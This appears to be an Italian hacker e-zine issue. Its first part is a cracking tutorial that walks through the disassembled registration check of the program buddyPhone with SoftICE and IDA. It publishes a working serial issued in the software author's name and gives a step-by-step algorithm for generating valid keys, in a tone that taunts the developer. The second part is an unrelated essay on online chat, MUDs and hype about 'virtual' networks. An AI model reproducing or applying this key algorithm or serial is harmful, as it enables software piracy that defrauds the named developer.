Allora vediamo un p•, allora come mi chiamo ? Antonio... ok questo lo so
e voi l'avrete capito pure.. quindi il primo dato  passato... seconda
voce... Last name... kazz!! Il mio cognome... e mika ve lo posso dire a voi,
gi… non so se manco m'e' scappata na denuncia al tribunale (ho avuto la bella
idea insieme a LanDLorD di chiamare l'autore di un programma che avevo
crackato, ma dico io mi potevo fare i kazzi miei!) quindi inventeremo un
cognome fittizio... vabb ho capito... non me ne vengono in mente di cognomi
assurdi... ok allora che facciamo ? Semplice, lo registriamo a nome
dell'autore!!! Si si proprio a nome di Henrik Pfluger, cos impara a non
rompere il kazzo con la pubblicit… gratuita!! Poi pi— tardi vado a dare
un'occhiata al suo sito... vedo cosa ci posso rimediare di utile per me ;)

Allora inseriamo Henrik Pfluger e leggiamo nella nota di ricordarsi anche
il product ID che viene messo in evidenza! 00010000  il solito su tutti
i pc... vabb ma non importa... ci mettiamo un bel numero di serie....
diciamo che stavolta ho scelto 1638... perch sto numero ?
Proviamo a convertire 1638 in esadecimale.. cosa ci viene ? 666h ;) LA BESTIA
di quel programmatore che mi dice clickando su ok che se ho inserito i dati
esatti devo contattare l'assistenza perch avr• sbagliato qualcosa!! No bello
mio, hai sbagliato tu a trovarti sul pc dei miei 2 amici... hai finito di
rompere il kazzo con la pubblicit…!! Ok...  il momento di entrare in azione
con gli strumenti del diavolo (SoftICE e Interactive Disassembler).

Innanzitutto disassembliamo con IDA il programma!

(... dato che IDA per i miei gusti ci sta mettendo un p• di tempo a creare
il codice.. io prendo una birra da bere.. voi fate quello che vi pare!)

... Ora abbiamo il disassemblato, SoftICE alla mano settiamo i soliti
breakpoint... allora ma leggiamo un'attimo il rapporto iniziale di IDA...
Leggo vc32mcf... il che significa routine standard e quindi per leggere
il testo sto bastardo usa GetWindowTextA... settiamo un bel breakpoint
sulla funzione e vediamo un p•....

... Clickiamo sul pulsante di registrazione e saremmo in SoftICE... ok
allora vediamo un p•... premiamo F12 e ci ritroveremo fuori dalla
libreria di Windows, e saremo dentro il codice di buddyPhone!!!

Precisamente in questa porzione di codice!!!

004406F4		 call	 ds:GetWindowTextA
... qui ora l'abbiamo saltata.. 

004406FA		 mov	 ecx, [ebp+arg_8]
004406FD		 push	 0FFFFFFFFh
004406FF		 call	 sub_43C03C
00440704		 jmp	 short loc_440711
Allora il programma qui salta per forza, il che significa che ha letto!

00440706 loc_440706:
00440706		 mov	 eax, [ebp+arg_8]
00440709		 push	 dword ptr [eax]
0044070B		 push	 esi
0044070C		 call	 sub_440291
00440711 
00440711 loc_440711:
00440711		 pop	 edi
00440712		 pop	 esi
00440713		 pop	 ebp
00440714		 retn	 0Ch

Ok arrivati a retn 0Ch premendo F10 ci ritroveremo qui.. in questo punto
di codice:

00412824		 call	 sub_4406C5
00412829		 lea	 edx, [esi+104h]
Noi ci ritroviamo precisamente su 00412829... ho riportato anche l'istruzione
precedente per farvi notare una cosa... infatti se porgete la vostra
attenzione sulle call ne troverete 3 alla stessa locazione!!! Il che significa
che il programmatore  un patito di codice C++... infatti i compilatori C++
riutilizzano il codice al meglio.. Sto disgraziato  arrivato a crearsi delle
funzioni per recuperare i testi.. quando poteva invocare direttamente l'API
di Windows.... povero stupido...  un illuso!!!

0041282F		 push	 edx
00412830		 push	 3F7h
00412835		 push	 edi
00412836		 call	 sub_4406C5
0041283B		 add	 esi, 108h
00412841		 push	 esi
00412842		 push	 3F9h
00412847		 push	 edi
00412848		 call	 sub_4406C5
0041284D		 pop	 edi
0041284E		 pop	 esi
0041284E sub_412800	 endp

Qui la funzione termina.... e noi ci ritroveremo in diverse funzioni.
Noteremo come il nostro bell'offset da 41284E salti eseguendo lo step
del codice in 439F07 fino ad arrivare a 4129F5!

004129F5		 lea	 ebp, [esi+104h]
Ora noi ci ritroviamo qui... precisamente qui... e noterete che il listato
assembly  lunghetto... considerando che ancora non abbiamo raggiunto il
nostro scopo primario!!! Quello di fregarci il codice di registrazione!!

004129FB		 lea	 ecx, [esp+3Ch+var_18]
004129FF		 push	 ebp
00412A00		 call	 sub_43B97E
00412A05		 lea	 ebx, [esi+108h]
00412A0B		 xor	 edi, edi
00412A0D		 push	 ebx
00412A0E		 lea	 ecx, [esp+40h+var_1C]
00412A12		 mov	 [esp+40h+var_4], edi
00412A16		 call	 sub_43B97E
00412A1B		 lea	 eax, [esi+100h]
00412A21		 lea	 ecx, [esp+3Ch+var_28]
00412A25		 push	 eax
00412A26		 mov	 byte ptr [esp+40h+var_4], 1
00412A2B		 call	 sub_43B97E
00412A30		 lea	 ecx, [esp+3Ch+var_18]
00412A34		 mov	 byte ptr [esp+3Ch+var_4], 2
00412A39		 call	 sub_43C0BF
00412A3E		 lea	 ecx, [esp+3Ch+var_1C]
00412A42		 call	 sub_43C0BF

Fino a qui abbiamo eseguito tutto.. ora per• la nostra attenzione deve
ricadere su questa sequenza di codice.. dove incontremo il primo cmp
che affronteremo.

00412A47		 push	 2Dh
2Dh ... a che vi fa pensare ... vediamo un p• equivale a 32+13=45 ... facciamo
ALT+45... un '-'... a che cosa gli serve ? vediamo un p•......

00412A49		 lea	 ecx, [esp+40h+var_28]
00412A4D		 mov	 [esp+40h+var_10], edi
00412A51		 call	 sub_43C084
Richiama questa call.. per• ne ecx ed edi contengono uno straccio di codice
che ci ritorna utile.. per• mi sa tanto che questa storia del trattino non
mi convince!!!

00412A56		 mov	 edi, eax
00412A58		 cmp	 edi, 0FFFFFFFFh
00412A5B		 jz	 loc_412C21

ECCO QUI... infatti come non detto.... il trattino... a quanto pare pure sto
seriale  diviso in due segmenti... quindi dobbiamo mettere 2 codici separati
da un trattino!!!

00412A61		 mov	 eax, [esp+3Ch+var_18]
Ora eax tiene memorizzato la posizione del nostro nome!

00412A65		 mov	 ecx, [eax-8]
invece ecx tiene la lunghezza del nome, 6 per il nostro bell'autore!!!

00412A68		 test	 ecx, ecx
00412A6A		 jz	 loc_412C21
00412A70		 mov	 ecx, [esp+3Ch+var_1C]
Qui ecx invece al posto della lunghezza prende le sembianze del cognome...

00412A74		 mov	 eax, [ecx-8]
e qui eax quelle del nome!
00412A77		 test	 eax, eax
00412A79		 jz	 loc_412C21

Per farla breve con due test s'assicura che abbiamo compilato i campi della
registrazione! Ti fanculo ;) io ho messo il nome del tuo autore brutto
deficente!!! Non lo potevi fare un bel rep cmpsb sul nome per vedere che
 il tuo e registrarti prima ? Vabb... mi vendico!!!

00412A7F		 lea	 edx, [esp+3Ch+var_28]
Qui invece edx punta al nostro numero che abbiamo inserito!!!

00412A83                 lea     ecx, [esp+3Ch+var_20]
00412A87		 push	 edx
00412A88		 call	 sub_43B97E
00412A8D		 lea	 eax, [esp+3Ch+var_28]
00412A91		 lea	 ecx, [esp+3Ch+var_24]
00412A95		 push	 eax
00412A96		 mov	 byte ptr [esp+40h+var_4], 3
00412A9B		 call	 sub_43B97E
00412AA0		 lea	 ecx, [edi+1]
... qui m'era venuto un dubbio.. che cosa  quel numero puntato da ecx ?
Un seriale ? noo..... non  quello... cattivo sei cattivo!!!!

00412AA3		 lea	 edx, [esp+3Ch+var_14]
00412AA7		 push	 ecx
00412AA8		 push	 edx
00412AA9		 lea	 ecx, [esp+44h+var_20]
00412AAD		 mov	 byte ptr [esp+44h+var_4], 4
00412AB2		 call	 sub_435DE7
00412AB7		 push	 eax
Fermi tutti!!! EAX qui contiene un frammento del seriale... quello messo
dopo del trattino... qui la cosa puzza!!!!

00412AB8		 lea	 ecx, [esp+40h+var_20]
00412ABC		 mov	 byte ptr [esp+40h+var_4], 5
00412AC1		 call	 sub_43BCF6
00412AC6		 lea	 ecx, [esp+3Ch+var_14]
00412ACA		 mov	 byte ptr [esp+3Ch+var_4], 4
00412ACF		 call	 sub_43BC09
00412AD4		 mov	 eax, [esp+3Ch+var_28]
00412AD8		 lea	 ecx, [esp+3Ch+var_14]
00412ADC		 mov	 eax, [eax-8]
00412ADF		 sub	 eax, edi
00412AE1		 dec	 eax
00412AE2		 push	 eax
00412AE3		 push	 ecx
00412AE4		 lea	 ecx, [esp+44h+var_24]
00412AE8		 call	 sub_435D6B
00412AED		 push	 eax
00412AEE		 lea	 ecx, [esp+40h+var_24]
00412AF2		 mov	 byte ptr [esp+40h+var_4], 6
00412AF7		 call	 sub_43BCF6
00412AFC		 lea	 ecx, [esp+3Ch+var_14]
00412B00		 mov	 byte ptr [esp+3Ch+var_4], 4
00412B05		 call	 sub_43BC09
00412B0A		 mov	 edx, [esp+3Ch+var_18]
00412B0E		 mov	 ecx, [esp+3Ch+var_1C]
00412B12		 mov	 al, [edx]
Allora se avrete notato ben ben lo scorrere dei vari registri vi sarete
accorti durante lo step... (non fate il trace senn• vi rincoglionite!!!
rischiate di affondare dentro le funzioni del Visual C++) che il nostro
nome e cognome  stato convertito in maiuscolo.... ed ora il programmatore
in EDX contiene il nome, mentre in ECX contiene il cognome!
Ma ora sta caricando la prima lettera del nome!! Che ci vuol fare ?

00412B14		 mov	 dl, [ecx]
E con la prima del cognome ? Brutto deficiente che vuoi fare ?

00412B16		 mov	 [esp+3Ch+var_29], al
Lo voglio sapere... qui salva l'iniziale del nome!! Che vuoi fare ???
Dimmelo......

00412B1A		 mov	 eax, [esp+3Ch+var_20]
00412B1E		 push	 eax
00412B1F		 mov	 [esp+40h+var_2A], dl
00412B23		 call	 _atoi
Hei.. ha convertito il nostro seriale iniziale ... la bestia 1638-666
in un intero!! Infatti ora EAX contiene 00000666h in esadecimale! La
bestia!!! ;) Brutto zozzo... che vuoi fare ? Me lo dici ? Qui la cosa
incomincia a puzzare.. qui prima o poi spunta il mio codice!

00412B28		 movsx	 ecx, [esp+40h+var_2A]
00412B2D		 movsx	 edx, [esp+40h+var_29]
Riprende le iniziali di cognome e nome...

00412B32		 shl	 ecx, 8
Moltiplica l'iniziale del cognome per 256 (infatti la shifta a sinistra di
8 volte.. e se non lo sapete equivale a moltiplicare per 2 8 volte..
e quindi 2*2*2*2*2*2*2*2=256!)

00412B35		 add	 ecx, edx
Ei ma qui stiamo dando i numeri ? Al risultato zozzo ci sommi pure la
prima del nome ?

00412B37		 mov	 edx, dword_460270
Ei un'attimo che  sto valore.... 10000h ... puzza di bruciato la cosa...
10000 non era sottoforma di stringa il mio ID che dovevo comunicare ? A si..
ok... allora mi sa tanto che quel'ID veniva espresso in ESADECIMALE!!

00412B3D		 add	 eax, edx
Ma che sei scemo ? Mi sommi l'ID al mio primo seriale ?  A si.. ma allora
sei proprio scemo.... vabb!

00412B3F		 lea	 edi, [ecx+eax-8428h]
Ei qui carica in edi una strana coppia... allora vediamo un p•!
ECX mi tiene il codice dato dal valore ascii della prima del nome * 256
sommato al valore ascii della prima del cognome, EAX contiene la somma
dell'ID convertito in valore decimale alla prima parte del mio seriale!
Tutti e due i valori vengono sommati a -33832, quindi cosa tiene EDI ?
Provate ad indovinare... siiiiii bravissimi il nostro seriale!!!!! Si
ma quale dei due frammenti ?
00412B46		 mov	 eax, [esp+40h+var_24]
00412B4A		 push	 eax
00412B4B		 call	 _atoi
Il 2. pezzo del seriale viene convertito in intero

00412B50		 add	 esp, 8
00412B53		 cmp	 edi, eax
e viene confrontato!! E' esatto si o no ?
00412B55		 mov	 edi, 1
Inteliggente... lo cancella quello esatto per non lasciare traccia..
ma l'hai lasciato troppo brutto deficente!!! Lo dovevi calcolare dopo _atoi
mo la fai nel culo!

00412B5A		 jz	 short loc_412B60
So uguali ? Si.... allora salta senn• l'avemo fatta a quel paese!!

Bene a 00412B53 voi vi fate un bel ? EDI e vi verranno dati dei valori...
prendete quel numero e avrete il vostro bel codice di registrazione..
in poche parole quello dell'autore per quanto riguarda me!

Bye bye programma... sono un user registrato e non devo vedere la tua fottuta
scheda di pubblicit…!!! Brutto zozzo bastardo!!!!! Niente pi— pubblicit…!!!

Qui l'articolo potrebbe essere finito.. ma chi di voi non ha SoftICE e
soprattutto non conosce l'asm che cazzo deve fare per registrarsi ?

Allora innanzitutto rilascio i seriali da me trovati:
Nome: Henrik
Cognome: Pfluger
Seriale: 1638-53894

Ma cosa possiamo fare ? .... un bel keymaker!!!! Si non sar… tanto difficile
( a questo momento una persona si sta rosicchiando il fegato.... dovevo
solo dirgli come trovare il seriale... ma se gli faccio pure un keymaker
mi sa tanto che se lo rosicchia per benino!!! non c'e' motivo d'arrabbiarsi
Johnny!!! ;))

Allora vi spiego subito l'algoritmo, anche se troverete allegato all'articolo
il keymaker!

1. Prendiamo in considerazione il Product ID datoci dal programma!
   00010000
   Convertiamolo in decimale... che equivale a 65536... ovvero 16bit tondi
   tondi!
2. Inseriamo un nome ed un cognome! Prendiamo la prima lettera del nome..
   assicurandoci che sia maiuscola e la prima lettera del cognome, sempre
   maiuscola! Se inseriamo nome e cognome minuscolo convertite le iniziali
   in maiuscolo.... tipo h per Henrik e p per Pfluger, quindi noi dovremmo
   avere H e P.
3. Moltiplichiamo il valore ascii della prima lettera del cognome per 256 e
   sommiamo il valore ascii della prima lettera del nome.
   Es. P*256+H = 80*256+72
4. Prendiamo un numero fittizzio... compreso tra 1 e 655356, usate quello
   che vi pare... 666 1638 (la bestia in esadicimale!).
5. Sommate a questo numero fittizzio il vostro Product ID cio 65536 nel
   caso riportato da me (e nella stramaggioranza delle versioni!!!)
6. Ora sommate il valore del punto 3 e del punto 5 e addizzionateli al
   valore -33832
7. Avviate la schermata di registrazione:
   Inserite come iniziale di nome la lettera che avete scelto per il nome
   ed un nome a caso!
   Inserite come iniziale di cognome la lettera scelta ed il cognome pure a
   caso...
   Esempio:
   H posso mettere anche Hi o Henrik o Hawai
   P come Pfluger o Porcocanesefattoquasimezzogiorno

   Andate nella schermata di registrazione:
   Inserite il numero fittizzio, un trattino e il valore ricavato al punto 6.

   Es. 666-xxxxx dove xxxxx viene sostuito col numero!

8. Ancora non avete clickato sul pulsante per registrarvi ? A chi aspettate ?
   Che ve lo dica io ? E ma allora non tenete voglia di condurre un'attivit…
   tutta per voi!

Bene, se l'avete capito stavolta termina proprio qui!!! SIIII proprio qui!!

Ringraziamenti:
Il mio amico A.P. che mi ha chiesto di fare il keymaker.... e tempo fa mi
aveva chiesto se potevo registrare questo programma... anche se ancora
non mi ero accorto di come funzionava il keymaker.. piccoli incidenti di
percorso... si migliora con la vecchiaia, come il vino ;)
Johnny, per avermi chiesto di scrivere un tutorial su come crackarlo....
poraccio non c'era riuscito!! Latino ti ha interrogato ? ;) GEDEA a che
punto sta ? Poi vedo come spedirti quel libro di 400 pagine sull'assembly..
Nobody88 che pubblicher… anche questo tutorial.... ora gli sto monopolizzando
la sua rivista che tra l'altro non leggo poi tanto... ;) Grazie per avermi
dato del vecchio nella mail!!! M'ha detto che sono un veterano... in poche
parole che so vecchio!!!!
dibbe76 per l'invito che mi ha fatto... e gli ribadisco che poi vado da lui
a crackare... riesco a stare lontano da un pc al massimo 48 ore.. poi sballo!

Un saluto a:
Tutti quelli che sanno chi sono.... em per favore  sia nei miei e nei vostri
interessi farci i FATTI NOSTRI (quelli che si vogliono fare I FATTI VOSTRI
... cio i NOSTRI so pregati di starne fuori!!) altrimenti qui io so ne guai..
mi licenziano pure ;) e la peggior cosa e che poi sbattono dentro pure voi!
A Blu'eyes, uno dei tanti che ho conosciuto durante le fredde mattine
in cui mi connettevo alle 5 per navigare e scaricare!!! Mi ha fatto piacere
rivederlo in irc ;)

NOTA:
Io non mi assumo nessuna responsabilit… per i danni che posso arrecare a
HENRIK PFLUGER, la colpa non  mia se commettete errori...

UNA SECONDA NOTA:
Ultimamente mi ero convinto che i miei paesani fossero migliorati, ma dal
colloquio di ieri sera con uno di essi mi sono straconvinto che sono per
la maggior parte na massa di deficenti cafoni! SOLO PERCHE' HO FATTO una
ricerca su tutti gli IP che andavano da 0 a 255 .... e ne ho beccato
qualcuno di qui... ma andate a fanculo!!!

e-mail: billgates@microsoft.com per le proteste...
        cod@gurlmail.com se avete qualcosa da dirmi... altrimenti
                         non scrivete che non vi rispondo!
                                                         ore 12.05pm cod/e-ViP
                                                                 Vibo Valentia

ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ
²°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°²
²°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°²
²°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°²
²°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°²
²°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°²
ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ
NOTA DI N0bodY88 = il seguente articolo e' stato fatto dall'inimitabile
                   [-W|NZ-] e se noterete sembra che sia un art di un giornale
                   vero!!! Complimenti a [-W|NZ-] x questo ottimo articolo
                   in cui ci sono cose nelle quali mi rispecchio al 100%...
                   quindi...che dire...buona lettura :)
ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ
                    ֹֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽ»
                    ÷ִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִ¿÷
                    ÷³        INTERATTIVITA'        ³÷
                    ÷ְִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִ÷
                    ָֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽ¼

Quando (in un tempo non tanto lontano, ma che ormai mi sembra remoto) mi
interessavo allo studio della pubblicita', mi chiedevo perche' su quell'argomen
to si dicesse e si pubblicasse costantemente un cosi' straordinario ammasso di
superficialita' e di sciocchezze (il fenomeno continua; anzi, tende a
peggiorare). Mi rispondevo che era una specie di "contrappasso": la
pubblicita' e' cosi' diffusa, onnipresente, visibile, ingombrante, che anche chi
non ne ha la minima conoscenza si sente in dovere di dissertare in materia.
Ora che il mio interesse principale e' la "comunicazione elettronica interatti
va", e' ancora peggio. Quasi nessuno la conosce davvero (un italiano su mille,
forse due, ne ha un'esperienza non superficiale) ma da due anni in qua e'
l'argomento di moda: tutti ne parlano. O meglio, parlano di qualcosa che, per
quanto ne so, non esiste, e che ha assai poco a che fare con la realta' della
rete. Il motivo e' quel doppio vincolo Batesoniano, quel misto schizofrenico
di attrazione e repulsione, che suscitano le cose nuove.  Pare che quando,
cent'anni fa, cominciavano a circolare le prime automobili, il mondo fosse
percorso da un fremito di paura e da infinite leggende. Illustri professori
spiegavano che un organismo umano non era in grado di sopravvivere alla
velocita' di 25 chilometri all'ora. Ho sentito non meno illustri professori,
al giorno d'oggi, dire cose non meno assurde sulla rete. La mancanza si una
socializzazione sulla rete si puo' dividere, grosso modo, in due categorie.
L'esagerazione teatrale o fantascientifica; e un'irrazionale, "tecnofobica"
paura. Le due cose, naturalmente, si mescolano; e sono ugualmente nocive.

I cibersogni

Mi domando che idea possa farsi della rete una persona che non ne abbia
esperienza personale e che guardi, un po' assonnata, una delle tante
trasmissioni televisive che ci vogliono abbacinare con le presunte meraviglie
del "ciberspazio"; o veda l'uso "miracolistico" della rete che ci viene mostra
to in tanti film o raccontato sui giornali. Paesaggi "virtuali", spazi
dadaisti, immagini surrealiste, un mondo onirico-ossessivo popolato non di
esseri umani ma di androidi e robot che si muovono in uno spazio irreale.
Certo: in rete si trovano anche quelle cose, come si trovano in qualsiasi
libreria e in un'infinita' di storie a fumetti, di letteratura di tutti i
tempi e di pitture anche piu' antiche di quelle di Hieronymus Bosch. Certo,
c'e' una cultura "ciberpunk" che ha avuto e ha ancora un suo spazio nella
rete, con infinite variazioni dal piu' ingenuo fumettismo alle geniali
fantasie di William Gibson. Queste cose, insieme a migliaia di altre, sono
nella rete. Ma non sono la rete, ne' sanno come descriverne il futuro. Con
tutto il rispetto per quel genio che fu Jules Verne, nella storia della
navigazione moderna c'e' tutto fuorche' il Nautilus del Capitano Nemo; e i
viaggi sulla Luna sono molto diversi dalla sua descrizione, come da quelle di
cento scrittori che l'hanno preceduto o seguito. In generale, credo che i
ragionamenti sulla rete migliorerebbero se fossero definitivamente eliminate
dal lessico tutte le parole che cominciano con "ciber" (o peggio con "cyber",
che in italiano e' un errore di ortografia). Non per un banale o pedante
formalismo - ma perche' quella terminologia tende a dare la falsa impressione
che la rete sia un mondo separato e irreale. Perfino Nicholas Negroponte,
spesso citato (non sempre a proposito) come il profeta di tutte le
esagerazioni tecno-fantastiche, nel 1994 alla fine di di Being Digital
scriveva: "vi prego di notare che in tutto il libro ho usato una sola volta
la parola ciberspazio". Ecco un piccolo, e parziale, elenco dei sogni e delle
"false promesse":

"Virtuale"

Non ho mai capito bene che cosa voglia dire "virtuale". La parola e' molto di
moda, ma sembra che nessuno ne abbia una definizione chiara. Fin dalle origini
della nostra specie viviamo in mondi "virtuali". Tutte le notti, in sogno;
anche da svegli, nelle nostre fantasie. Tutta la letteratura, la musica, la
pittura della storia umana non hanno mai fatto altro che trasportarci in
luoghi e situazioni diverse dalla nostra vita "fisica" di tutti i giorni. Il
confine fra sogno e realta' e' sempre stato molto meno nitido di quello che
sembra. Che cos'e' una rappresentazione teatrale, con scene, costumi e effetti,
se non un mondo "virtuale"? E, nello stesso modo ma con tecniche diverse, il
cinema e la fotografia? O una carta geografica? Oggi ci sono nuove tecniche,
consentite dall'informatica, per fare queste cose. Ma la sostanza non cambia;
non piu' di quanto sia cambiata con l'invenzione, appunto, della fotografia o
del cinema. Va detto anche che queste cose hanno assai poco a che fare con la
rete, perche' spesso le troviamo non sull'internet, ma su un cd-rom (e quando,
fra non molto, avremo dischi ottici con capacita' dieci o venti volte
superiori a quelli attuali...). Soprattutto, occorre capire che la parte piu'
significativa della rete non sta in queste, sia pure interessanti,
esplorazioni artistiche, ma nella possibilita' che ci da' di raggiungere
esperienze molto reali: fatti, opinioni, informazioni e persone. Che al primo
incontro non possiamo vedere, ne' toccare; ma non per questo sono "virtuali".
Sono persone come noi, in carne e ossa.ָ vero: esistono macchine che
consentono una "simulazione". Possono essere usate per gioco, o per motivi
molto seri, come l'addestramento di un pilota d'aeroplano. Ma sono un
piccolissimo dettaglio rispetto alle infinite applicazioni dell'informatica,
e poco o nulla hanno a che fare con la rete. ָ vero: esistono simulazioni
tridimensionali che hanno applicazioni utili e serie, per esempio in
architettura. Ma sono, appunto, funzionali, e non inutili barocchismi
decorativi.ָ vero: con le nuove tecniche possono nascere nuove espressioni
artistiche, e la grafica del computer non e' solo un modo piu' veloce per fare
le stesse cose che si facevano prima. Gia' ne abbiamo visto, abbondantemente,
le applicazioni nel cinema. Ma siamo, credo, ancora nella fase "infantile",
in cui ci si lascia trasportare dalla tecnica e si va alla ricerca del
surrealista e del bizzarro; come accadde, per esempio, nel cinema ai tempi di
Georges Me'lie's. C'e' molto da ragionare, del resto, su quali miracoli di
fantasia si fecero allora nel cinema (pensiamo per esempio a Metropolis di
Fritz Lang) con risorse tecniche che oggi sembrano paleolitiche. Un argomento,
senza dubbio, affascinante; ma che poco o nulla ha a che fare con la rete,
che di queste opere d'arte (se e quando lo siano davvero, non sempre e' facile
giudicare) puo' essere al massimo il mezzo di trasporto. E quindi ecco
arrivare l'argomento che interessa questo mio lavoro: le chat, i luoghi di
conversazione in cui si "chiacchiera" e si scambiano opinioni in tempo reale.
Ci sono anche chat internazionali (come IRC, Internet Relay Chat, con migliaia
di room, "stanze", in tante lingue diverse, compreso l'italiano) in cui e'
diffusa l'usanza di usare pseudonimi (alias o nickname) e quindi incarnare
personalita' che possiamo inventare come meglio ci piace, presentandoci in una
maniera del tutto nuova, in accordo a come gli altri costantemente ci generali
zzano secondo gli stereotipi presenti in ogni societa'. In questi "salotti" si
possono anche fare conversazioni serie, ma piu' spesso si scherza. Esistono
anche centinaia di MUD (Multi-User Domain; o Multi-User Dungeon, dai tempi
in cui era di moda un vecchio gioco, Dungeons and Dragons), e cose analoghe
chiamate MUSE (Multi-User Simulated Environment), MOO (Mud, Object Oriented)
o addirittura MUSH (Multi-User Shared Hallucination). Sono ambienti di gioco
e immaginazione in cui persone diverse si incontrano in spazi immaginari,
spesso fantastici o fantascientifici, e con identita' che costruiscono come
meglio credono. Per alcuni questo non e' solo un gioco, ma una seconda realta',
un "mondo" in cui possono muoversi con identita' diverse, con mille ruoli da
interpretare e mille maschere da indossare. Ci sono anche i primi esperimenti
di "siti" come Worlds Chat, in cui il gioco non e' piu' solo verbale, ma i
luoghi sono rappresentati anche in modo visivo e il travestimento si realizza
anche in un'immagine (avatar). Ma tutto questo e' solo un'evoluzione di usanze
antiche, come le maschere di carnevale e i "giochi di ruolo"; anche questa e'
solo una piccolissima parte di cio' che accade in rete; e comunque, per quanto
spinto possa essere l'uso dell'immaginazione, cio' che incontriamo non e' quasi
mai un robot; e' quasi sempre una persona reale, che sta divertendosi a
incarnare una sua fantasia, mentre noi facciamo la stessa cosa. Questo sara'
il tema del mio lavoro, un catarsi platonico continuo, uno sfogo virtuale ai
nostri desideri piu' inconsci, interpretare quindi un ruolo sociale sempre in
"retroscena" "Multimediale"Questa e' poco piu' che una parolina per venderci
macchine piu' complesse di quelle che ci servono. Da che mondo e' mondo ci si
esprime usando parole, musica e immagini. Non c'e' nulla di nuovo, se non che
(se siamo bravi) possiamo divertirci a mettere insieme musica, immagini e
parole usando il computer invece che il teatrino delle marionette. La verita'
e' semplice: parecchi programmi, specialmente giochi, contengono immagini e
musica. Per poterli usare abbiamo bisogno di una buona scheda video e
probabilmente un cd-rom (l'una e l'altro ormai sono accessori standard)
piu' una scheda musicale, che si trova facilmente a meno di duecentomila
lire. I giochi piu' recenti sono talmente stracarichi di orpelli, spesso solo
decorativi, da richiedere processori veloci e con abbondante memoria (RAM).
Il che costringe molti a sostituire un computer perfettamente efficiente con
una macchina di prestazioni piu' elevate solo per far giocare un bambino; cosa
abbastanza assurda, perche' esistono molti ottimi giochi che non hanno bisogno
di macchine particolarmente potenti. Insomma e' solo una speculazione
commerciale.In tutt'altro significato, la parola "multimediale" viene intesa
come la tendenza alla concentrazione di grandi imprese che con fusioni,
acquisizioni e alleanze tendono a invadere tutti i territori, unendo "sotto
un unico tetto" le cosiddette "quattro C": Computing, Communication, Content
e Consumer. Sarebbe lungo approfondire i pro e i contro di questa strategia;
ma e' molto probabile che queste mostruose concentrazioni tendano a riprodurre
nella rete il vecchio modello della comunicazione a senso unico (uno parla,
molti ascoltano) e quindi ad andare contro il valore piu' importante della
rete: la reale interattivita'  di cui parlo nella conclusione di questi
ragionamenti..

"Tante immagini straordinarie sul tuo schermo"
Con la nascita (recentissima) della World Wide Web, l'attenzione si e'
concentrata sulle immagini. Ma una delle cose piu' deludenti, per chi si
affaccia in rete pensando alle "immagini" (erotiche o non), e' scoprire con
quale esasperante lentezza, specialmente con le non eccellenti connessioni
che abbiamo in Italia, quelle immagini si formano sul monitor del nostro
computer.Un giorno, forse, quando ci saranno davvero le "autostrade" e non i
sentieri di cui oggi disponiamo, quando saranno normali collegamenti ISDN,
schede digitali con una velocita' piu' che doppia rispetto ai modem di oggi
(o le tecnologie che li sostituiranno), eccetera, la rete sara' anche un
terreno di scambio di immagini. Oggi, e per il prevedibile futuro, lo
strumento rimane quello che e' da sempre la base delle relazioni umane: la
parola. Chi non trova nulla da leggere, o da scrivere, non rimane a lungo
in rete."ָ facile"Non e' del tutto vero. O meglio, le difficolta' sono diverse
da quelle che ci aspettiamo. Fatta la prima installazione (per i non esperti
e' meglio farsi aiutare da un tecnico) usare i programmi e collegarsi e'
facile davvero. Non piu' difficile che imparare a usare un videoregistratore
o un forno a microonde; molto piu' facile (e meno rischioso) che guidare
un'automobile. Certamente piu' facile di quanto pensi che non ha faliliarita'
con il computer, o di come si possa pensare se si ascoltano o si leggono le
astruse dissertazioni dei tecnici o le fantastiche divagazioni di certi
intellettuali. Ma la vera difficolta' non sta nelle tecniche di collegamento.
Una volta affacciati in rete, si tratta di capire dove andare... solo una
buona dose di pazienza e di curiosita' puo' far superare questo primo scoglio
e guadagnare quella confidenza che non si puo' acquistare se non con
l'esperienza pratica."Milioni, miliardi""Potrai incontrare in rete milioni
di persone". Non e' vero. Basta pensarci un attimo per capire che nessuno di
noi riesce a dialogare in modo comprensibile con piu' di qualche decina di
persone. Chi ha un minimo di esperienza impara presto che "navigare" vuol
dire scegliere: trovare i "siti" e le persone che ci interessano. Il che,
all'inizio, non e' facile. Si impara solo con l'esperienza. La novita' c'e',
ed e' davvero importante: possiamo dialogare tranquillamente con qualcuno
che sta in Australia; e possiamo conoscere una persona interessante che
magari abita a trecento metri da casa nostra ma che altrimenti non avremmo
mai conosciuto. E qui entriamo davvero nella parte viva della rete...Quanto
alle dimensioni... sono abbondantemente sovrastimate. Si parla di centinaia
di milioni di persone, di un miliardo alla fine di questo decennio. Non e'
vero; o non ancora. I numeri, per ora, sono molto piu' piccoli, anche se
stanno gradualmente crescendo. Le tecnofobieLa lista sarebbe interminabile...
